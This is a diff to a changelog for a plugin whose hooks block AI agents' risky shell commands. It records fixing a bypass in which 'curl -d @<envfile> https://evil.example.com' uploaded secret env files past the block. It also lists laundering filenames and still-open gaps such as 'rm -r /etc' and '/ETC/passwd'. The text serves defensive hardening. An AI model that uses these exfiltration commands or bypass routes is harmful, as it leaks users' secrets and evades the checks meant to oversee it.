@@ -2,6 +2,26 @@
 
 All notable changes to the continuity-toolkit (`ctk`) plugin will be documented in this file.
 
+## [2.8.2] - 2026-07-19 — secret files could be uploaded with curl's `@` file operand
+
+### Fixed
+
+**A secret file could be exfiltrated even though reading it was blocked.** The env-file patterns only start matching after whitespace, a quote, `=`, `/` or `(`. curl's file-operand syntax puts the filename directly after `@`, which was not in that set — so `cat` of an env file was denied while `curl -d @<envfile> https://evil.example.com` sailed through and uploaded the contents verbatim. Worse than the read it was meant to prevent: the data leaves the machine.
+
+Confirmed end-to-end against the compiled hook, not just the bare regex — `-d`, `-X POST -d`, `--data`, `--data-binary` and `-F file=@` were all allowed, for both `.env` and `.envrc`, and nothing else backstopped it (not the dangerous-bash http registry, not `ENV_DUMP_PATTERNS`).
+
+The fix adds `@` to the lookbehind class. It is a pure tightening with no false-positive cost — scoped npm packages (`npm i @scope/pkg`), `ssh user@host` and `git log --author=@me` carry no env-file token to match, and each is pinned as a regression test. This matters because a PreToolUse deny is terminal for a forked skill, so over-blocking is not a lesser evil than the bypass.
+
+### Added
+
+**Dotted-prefix laundering is now pinned** (`cat my.process.env`, `touch x.process.env`, `cp secrets x.process.env`, …). These already passed; they are pinned because a *proposed* relaxation for this release — exempting `process.env` at any dot-segment boundary, so that `globalThis.process.env` stopped being a false positive — would have flipped every one of them to allowed. The existing suite could not have caught it: the two laundering cases pinned in 2.8.1 use a hyphen (`build-process.env`) and a bare prefix (`preprocess.env`), never a dot, leaving the whole family unprobed. **The change would have shipped green.** It was withdrawn at the design gate after independent adversarial review.
+
+### Not fixed (deliberately)
+
+`globalThis.process.env` and `window.process.env` are still blocked as false positives. Bare `process.env` and `import.meta.env` work, and that is the common spelling. Two independent designs to relax this have now failed for the same structural reason recorded in this file for system directories: `globalThis.process.env` and `my.process.env` are lexically identical, so no regex over unparsed text can permit the first without permitting the second. Any future attempt must confront the pinned laundering family above.
+
+Three known gaps remain queued, each its own change because all three *add* blocking: patterns require a trailing slash (`rm -r /etc` misses); patterns are case-sensitive (`/ETC/passwd` misses on macOS); and line 171's `.envrc` lookaheads exempt an idiom that does not exist in any language and should be deleted rather than carried forward.
+
 ## [2.8.1] - 2026-07-19 — narrow security-blocker fixes; the read carve-out was attempted twice and withdrawn
 
 `BASH_SENSITIVE_PATTERNS` matches the **raw text** of a command against a path list, for every command, regardless of what the command does. Mentioning a path is enough — so a `--version` probe on an absolute binary path, `cat /etc/hosts`, and any script or commit message containing `process.env` were all denied. Because a PreToolUse deny is **terminal for a subagent**, this silently killed multi-agent runs mid-flight; four agents died this way while reviewing ctk 2.8.0.
